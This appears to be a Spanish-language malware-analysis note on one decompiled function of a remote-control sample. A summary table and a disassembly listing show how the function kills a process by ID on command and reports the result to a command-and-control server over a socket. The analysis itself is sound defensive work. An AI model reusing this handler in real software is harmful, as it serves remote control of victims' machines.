# FUN_00402440 - Opcode 8

La función FUN_00402440 tiene un propósito claro: terminar un proceso dado por ID, usando una lógica condicional para notificar al servidor C2 (Command & Control) si tuvo éxito o no.

Acción	Descripción
Toma un puntero a un identificador de proceso	param_2
Usa OpenProcess y TerminateProcess	Intenta matar el proceso
Informa al C2 si tuvo éxito o no	usando Ordinal_19 (probablemente send)
Usa 0x30 (OK) o 0x31 (FAIL)	como códigos de estado

_____________________________________

# FUN_00402440 Decompilada

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined __thiscall FUN_00402440(void * this, undefined
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
             void *            ECX:4 (auto)   this
             undefined4        Stack[0x4]:4   param_1
             byte *            Stack[0x8]:4   param_2                                 XREF[1]:     00402440(R)  
                             FUN_00402440                                    XREF[1]:     FUN_004012f0:004017b7(c)  
        00402440 8b 44 24 08     MOV        EAX,dword ptr [ESP + param_2]
        00402444 50              PUSH       EAX
        00402445 e8 23 05        CALL       FUN_0040296d                                     undefined FUN_0040296d(void * th
                 00 00
        0040244a 83 c4 04        ADD        ESP,0x4
        0040244d 50              PUSH       EAX
        0040244e 6a 00           PUSH       0x0
        00402450 6a 01           PUSH       0x1
        00402452 ff 15 64        CALL       dword ptr [->KERNEL32.DLL::OpenProcess]          = 000099e2
                 90 40 00
        00402458 6a ff           PUSH       -0x1
        0040245a 50              PUSH       EAX
        0040245b ff 15 60        CALL       dword ptr [->KERNEL32.DLL::TerminateProcess]     = 000099ce
                 90 40 00
        00402461 85 c0           TEST       EAX,EAX
        00402463 6a 00           PUSH       0x0
        00402465 6a 02           PUSH       0x2
        00402467 74 11           JZ         LAB_0040247a
        00402469 8b 4c 24 0c     MOV        this,dword ptr [ESP + 0xc]
        0040246d 68 94 a1        PUSH       DAT_0040a194                                     = 30h    0
                 40 00
        00402472 51              PUSH       this
        00402473 ff 15 68        CALL       dword ptr [->WS2_32.DLL::Ordinal_19]             = 80000013
                 91 40 00
        00402479 c3              RET
                             LAB_0040247a                                    XREF[1]:     00402467(j)  
        0040247a 8b 54 24 0c     MOV        EDX,dword ptr [ESP + 0xc]
        0040247e 68 90 a1        PUSH       DAT_0040a190                                     = 31h    1
                 40 00
        00402483 52              PUSH       EDX
        00402484 ff 15 68        CALL       dword ptr [->WS2_32.DLL::Ordinal_19]             = 80000013
                 91 40 00
        0040248a c3              RET
        0040248b 90              ??         90h
        0040248c 90              ??         90h
        0040248d 90              ??         90h
        0040248e 90              ??         90h
        0040248f 90              ??         90h

```
